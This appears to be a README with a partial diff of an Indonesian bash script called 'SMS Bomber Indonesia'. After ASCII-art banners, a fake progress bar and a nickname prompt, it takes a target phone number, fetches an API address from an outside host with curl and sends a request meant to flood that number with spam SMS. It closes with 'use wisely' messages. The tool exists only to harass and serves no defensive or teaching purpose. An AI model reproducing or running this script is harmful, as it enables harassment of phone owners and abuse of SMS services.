# Spam-sms-
use wisely :)
@@ -1,45 +1,67 @@
#!/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////             l -----------  l---------l  l-------- l l--------l      ////
#////             l -----------  l---------l  l-------- l l--------l      ////
#////             l              l        /   l         l l        /      ////
#////             l -----------  l ----- /    l         l l-------/       ////
#////             l              l       \    l         l l       \       ////
#////             l              l        \   l         l l        \      ////
#////             l -----------  l         \  l --------l l         \     ////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
bom(){
    sleep 0.03
    echo "      _.-^^---....,,-- "
    sleep 0.03
    echo "  _--                  --_ "
    sleep 0.03
    echo " <                        >) "
    sleep 0.03
    echo " |                         | "
    sleep 0.03
    echo "  \._                   _./ "
    sleep 0.03
    echo "     '''--. . , ; .--'''    " 
    sleep 0.03
    echo "           | |   |           "
    sleep 0.03
    echo "        .-=||  | |=-.    "
    sleep 0.03
    echo "        '-=#$%&%$#=-'    "
    sleep 0.03
    echo "           | ;  :|      "
    sleep 0.03
    echo "  _____.,-#%&$@%#&#~,._____ "
    sleep 0.03
    echo "============================="
    sleep 2
    echo "==   SMS Bomber Indonesia  =="
    sleep 0.7
    echo "============================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
clear
load
clear
bom
echo Selamat datang kak, Siapa nick kaka? #tulisan keluar
read nick #membaca yang ditulis
sleep 0.03
echo "      _.-^^---....,,-- "
sleep 0.03
echo "  _--                  --_ "
sleep 0.03
echo " <                        >) "
sleep 0.03
echo " |                         | "
sleep 0.03
echo "  \._                   _./ "
sleep 0.03
echo "     '''--. . , ; .--'''    " 
sleep 0.03
echo "           | |   |           "
sleep 0.03
echo "        .-=||  | |=-.    "
sleep 0.03
echo "        '-=#$%&%$#=-'    "
sleep 0.03
echo "           | ;  :|      "
sleep 0.03
echo "  _____.,-#%&$@%#&#~,._____ "
sleep 0.03
echo "============================="
sleep 2
echo "==   SMS Bomber Indonesia  =="
sleep 0.7
echo "============================="
clear
load
clear
bom
echo Selamat datang $nick ":)"
get_url=$(curl -s http://zlucifer.com/api/sms.php)
cek='curl -s '$get_url # check status
@@ -61,28 +83,19 @@ else
    read confirm
    echo
    if [ $confirm = "y" ]; then
        load
        clear
        echo Melakukan spam SMS ke nomor $target
        i=0
        max=100
        while [ $i -le $max ]; do
        echo -ne "\nSpamming percentage : $i% "
        sleep 0.03
        if [ $i -eq 100 ]; then
            echo -ne " [complete!]\n"
        echo
            echo "Jangan close aplikasi sebelum spam selesai"            
            echo "========================================"
            target_do=$get_url'/sms.php?nomor='$target'&paket='$paket


            CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
            echo " Gunakan tools dengan bijak"
            echo
            echo " Love u always "
            echo " -Cyber Er0r-"
            echo "======================================="
            fi
            let i++
            done
    else
        echo "Kesalahan"
    fi
